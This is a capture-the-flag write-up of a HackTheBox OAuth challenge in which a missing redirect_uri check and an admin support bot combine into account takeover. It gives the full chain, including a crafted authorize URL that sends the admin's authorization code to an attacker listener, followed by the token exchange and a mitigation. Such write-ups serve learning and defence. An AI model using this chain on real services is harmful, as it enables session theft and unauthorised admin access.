# Gateway — Web / OAuth

**Competition:** [ECU x NCNG CTF](https://ctf.hackthebox.com/event/details/ecu-x-ncng-ctf-3676) (HackTheBox)
**Category:** Web / OAuth · **Result:** ✅ Solved
**Flag:** `HTB{0Auth_R3d1r3ct_V4l1d4t10n_F41l}`

---

## The short version

This login system would mail its "proof of login" to any address I named, instead of only to
its own trusted address. By tricking an automatic admin helper into logging in and sending
that proof to a mailbox I controlled, I was able to steal the admin's session and read the flag.

## Walkthrough

This was my favorite challenge of the competition because it chained a few small mistakes
together into a full account takeover. To explain it simply: in an OAuth login flow, after you
log in, the server sends a one-time **authorization code** back to a pre-registered return
address. The problem was that this server only checked whether a return address was *provided*,
not whether it was the *correct, registered* one. As a result, it would happily send that code
anywhere I told it to.

On its own that is already a serious flaw, but what made it exploitable was a second piece: the
site had an automated "Service Desk" feature that runs an **admin** bot. This bot visits any
web path you submit to it. This is important because it meant I had a way to make a trusted
admin account perform an action on my behalf.

So I put the two together. I submitted a support ticket that pointed the admin bot at a login
URL whose return address was a listener that I controlled. The bot then logged in as the admin,
and its browser forwarded the admin's one-time authorization code straight to my listener. From
there, I exchanged that code for an admin access token (the system did not require any secret to
do this), loaded the admin profile with that token, and the flag was sitting right there.

The lesson, which the flag itself basically spells out, is that an OAuth server has to check the
return address against a strict, exact list of approved addresses before it ever hands out a
code. Overall, "is a return address present?" is simply not the same question as "is this the
correct return address?"

## Technical detail

- **Stack:** Express app fronting an OAuth2 authorization flow with an automated Service Desk
  reviewer.
- **Core flaw:** `validateAuthorizeRequest()` checks `response_type`, `client_id`, and that
  `redirect_uri` is *present*, but never validates it against the registered `/callback`. The
  authorization server therefore delivers a code to an arbitrary `redirect_uri`.
- **Trust source:** `/support/ticket` runs an authenticated **admin** bot that performs
  `GET baseUrl + path` on a submitted path, following redirects. The submitted value must
  contain a query string (a bare `/profile` is rejected; `/oauth/authorize?...` passes).
- **Public client:** `/oauth/token` requires only `client_id` + matching `redirect_uri`, no
  client secret.
- **Chain:**
  1. Submit a ticket with
     `path=/oauth/authorize?response_type=code&client_id=<id>&redirect_uri=<listener>&scope=read:profile&state=htb`.
  2. Admin bot authenticates, is issued an **admin** code, and the 302 leaks it to the listener:
     `GET /?code=6210d939-2e5c-4c55-b2d2-63ca7b917da8&state=htb` (observed `User-Agent: axios/1.13.4`
     from HTB's egress IP).
  3. `POST /oauth/token` with the code + `client_id` + the same `redirect_uri` → access token.
  4. `GET /profile` with the bearer token → admin profile + flag.
- **Mitigation:** strict exact-match allow-listing of `redirect_uri` against the registered
  callback; bind authorization codes to the issuing client.

---

*Tools used: curl, and an external request-capture listener to catch the leaked admin code.*
